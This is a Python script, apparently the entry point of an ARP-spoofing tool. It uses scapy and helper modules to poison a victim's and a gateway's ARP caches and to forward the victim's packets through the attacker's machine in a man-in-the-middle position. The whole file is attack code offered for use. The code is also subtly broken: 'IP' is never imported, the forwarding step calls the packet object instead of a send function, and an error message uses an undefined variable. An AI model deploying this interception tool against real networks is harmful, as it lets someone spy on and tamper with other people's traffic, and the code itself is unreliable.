import scapy.all as scapy

from src.service.log import Log
from src.utils.utils import Utils
from src.service.poison import Poison
from src.service.sniffer import Sniffer

log = Log()

try:
    victim_ip = Utils.get_victim_ip()
    victim_mac = Utils.get_mac(victim_ip)
    gateway_ip = Utils.get_gateway_ip()
    gateway__mac = Utils.get_mac(gateway_ip)
    attack_ip = Utils.get_attack_ip()
    attack_mac = Utils.get_attack_mac()
except IndexError as e:
    log.error('An unexpected occurred, please try again')
    log.error(f'Exception: {e}')


def monitor_callback(packet):
    try:
        victim_ip = Utils.get_victim_ip()
        victim_mac = Utils.get_mac(victim_ip)

        gateway_ip = Utils.get_gateway_ip()
        gateway__mac = Utils.get_mac(gateway_ip)

        attack_mac = Utils.get_attack_mac()
    except IndexError as e:
        log.error(f'Was not possible to find the mac addres of: {ip}')
        log.error(f'Exception: {e}')

    if IP in packet:
        if packet[scapy.Ether].src == victim_mac:
            packet[scapy.Ether].dst = gateway__mac
            packet[scapy.Ether].src = attack_mac
            packet(packet, verbose=0)
        elif packet[IP].dst == victim_ip:
            packet[scapy.Ether].dst = victim_mac
            packet[scapy.Ether].src = attack_mac
            packet(packet, verbose=0)


def log_start():
    log.info('Starting ARP Spoofing...')

    log.info(f'victim_ip..........:{victim_ip}')
    log.info(f'victim_mac.........:{victim_mac}')
    log.info(f'gateway_ip.........:{gateway_ip}')
    log.info(f'gateway_mac........:{gateway__mac}')
    log.info(f'attack_ip..........:{attack_ip}')
    log.info(f'attack_mac.........:{attack_mac}')


if __name__ == '__main__':
    log_start()
    try:
        sniffer = Sniffer(monitor_callback)
        sniffer.start()

        poison = Poison(
            victim_ip, gateway_ip, attack_mac
        )
        poison.start()
    except Exception as e:
        log.error('An unexpected occurred, please try again')
        log.error(f'{e}')
